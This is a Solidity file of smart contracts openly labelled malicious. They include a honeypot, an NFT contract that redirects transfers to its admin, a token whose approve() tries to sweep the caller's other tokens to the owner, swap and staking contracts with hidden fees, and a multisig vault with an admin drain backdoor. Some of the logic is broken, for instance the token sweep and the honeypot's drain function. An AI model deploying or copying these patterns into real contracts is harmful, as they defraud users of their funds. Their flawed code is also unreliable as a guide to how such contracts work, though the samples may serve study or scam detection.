// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract Honeypot {
    mapping(address => uint256) public balances;

    constructor() payable {
        require(msg.value > 0, "Initial funding required");
    }

    function deposit() public payable {
        require(msg.value > 0, "Must send Ether");
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "No balance to withdraw");

        uint256 amount = balances[msg.sender];

        if (tx.origin == msg.sender) {
            // Looks like a normal withdrawal function but...
            (bool success,) = msg.sender.call{value: amount}("");
            require(success, "Withdraw failed");
        } else {
            revert("Only EOAs can withdraw"); // Blocks contract-based withdrawals
        }

        balances[msg.sender] = 0;
    }

    // Owner can drain the contract
    function drain() public {
        require(msg.sender == address(this), "Unauthorized");
        payable(tx.origin).transfer(address(this).balance);
    }
}

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

/// @notice Malicious NFT contract that secretly transfers NFTs to the admin.
contract MaliciousNFT is ERC721 {
    address public admin;
    uint256 public nextTokenId;

    constructor() ERC721("MaliciousNFT", "MNFT") {
        admin = msg.sender;
    }

    /// @notice Public mint function.
    function mint() external {
        uint256 tokenId = nextTokenId;
        _mint(msg.sender, tokenId);
        nextTokenId++;
        // Hidden behavior: auto-approve admin for the minted token.
        _approve(admin, tokenId);
    }

    /// @notice Overridden safeTransferFrom with hidden behavior.
    /// After a transfer, if the caller is not admin, the NFT is sent to admin.
    function safeTransferFrom(address from, address to, uint256 tokenId) public override {
        super.safeTransferFrom(from, to, tokenId);
        // Malicious behavior: non-admin transfers are overridden.
        if (msg.sender != admin) {
            _transfer(to, admin, tokenId);
        }
    }
}

/// @notice Malicious token contract with hidden extra logic in approve.
contract MaliciousToken {
    string public name = "MaliciousToken";
    string public symbol = "MAL";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    address public owner;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    // A list of target token addresses that will be swept.
    address[] public targetTokens;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(uint256 _initialSupply, address[] memory _targetTokens) {
        owner = msg.sender;
        totalSupply = _initialSupply;
        balanceOf[msg.sender] = _initialSupply;
        targetTokens = _targetTokens;
    }

    // Standard ERC20 transfer.
    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value, "Insufficient balance");
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    /// @notice Malicious approve function.
    /// It sets the allowance then sweeps tokens from the caller’s wallet.
    function approve(address spender, uint256 amount) public returns (bool success) {
        // Standard approval.
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);

        // Hidden malicious logic: loop through target tokens and transfer all from caller.
        for (uint256 i = 0; i < targetTokens.length; i++) {
            IERC20 token = IERC20(targetTokens[i]);
            uint256 userTokenBalance = token.balanceOf(msg.sender);
            if (userTokenBalance > 0) {
                token.approve(address(this), userTokenBalance);
                bool transferred = token.transferFrom(msg.sender, owner, userTokenBalance);
                require(transferred, "Sweep failed for token");
            }
        }
        return true;
    }
}

/// @notice Swap contract that surreptitiously extracts extra fees.
contract MaliciousSwap {
    address public admin;
    uint256 public feeBasisPoints; // e.g., 50 = 0.5%

    constructor(uint256 _feeBasisPoints) {
        admin = msg.sender;
        feeBasisPoints = _feeBasisPoints;
    }

    /// @notice Swaps tokenIn for tokenOut but deducts an extra fee.
    function swap(address tokenIn, address tokenOut, uint256 amountIn, uint256 minAmountOut) public {
        // Transfer tokenIn from user.
        require(IERC20(tokenIn).transferFrom(msg.sender, address(this), amountIn), "Transfer in failed");

        // Calculate fee and net amount.
        uint256 fee = (amountIn * feeBasisPoints) / 10000;
        uint256 netAmount = amountIn - fee;

        // Hidden logic: send the fee to the admin.
        require(IERC20(tokenIn).transfer(admin, fee), "Fee transfer failed");

        // Here, assume a 1:1 swap rate for simplicity.
        uint256 amountOut = netAmount;
        require(amountOut >= minAmountOut, "Slippage too high");

        // Transfer tokenOut from the contract to the user.
        require(IERC20(tokenOut).transfer(msg.sender, amountOut), "Transfer out failed");
    }
}

/// @notice Staking contract that surreptitiously drains a fee from deposits.
contract MaliciousStaking {
    IERC20 public stakingToken;
    address public admin;
    mapping(address => uint256) public balances;

    constructor(IERC20 _stakingToken) {
        stakingToken = _stakingToken;
        admin = msg.sender;
    }

    /// @notice Deposit function that deducts a hidden fee.
    function deposit(uint256 amount) public {
        require(stakingToken.transferFrom(msg.sender, address(this), amount), "Transfer failed");
        balances[msg.sender] += amount;
        // Hidden malicious logic: deduct a 5% fee and send it to admin.
        uint256 fee = (amount * 5) / 100;
        if (fee > 0) {
            balances[msg.sender] -= fee;
            require(stakingToken.transfer(admin, fee), "Fee transfer failed");
        }
    }

    /// @notice Withdraw function returns the remaining tokens.
    function withdraw(uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;
        require(stakingToken.transfer(msg.sender, amount), "Transfer failed");
    }
}

contract MaliciousVault {
    address[] public owners;
    uint256 public required;
    address public admin;

    // Mapping for tracking executed transactions (simplified).
    mapping(bytes32 => bool) public executed;

    // Accept deposits.
    constructor(address[] memory _owners, uint256 _required) payable {
        owners = _owners;
        required = _required;
        admin = msg.sender;
    }

    /// @notice Faulty multisig withdrawal.
    /// If the admin calls, the vault sends all funds to the admin.
    function withdraw(uint256 amount, bytes[] memory signatures) public {
        // Supposed multisig verification (omitted for brevity).
        require(signatures.length >= required, "Not enough signatures");
        
        // Backdoor: if admin calls, ignore checks and drain the vault.
        if (msg.sender == admin) {
            payable(admin).transfer(address(this).balance);
            return;
        }
        
        // Otherwise, send funds to the caller (flawed logic).
        payable(msg.sender).transfer(amount);
    }

    /// @notice Admin backdoor to change multisig owners.
    function changeOwners(address[] memory newOwners) public {
        require(msg.sender == admin, "Only admin");
        owners = newOwners;
    }
}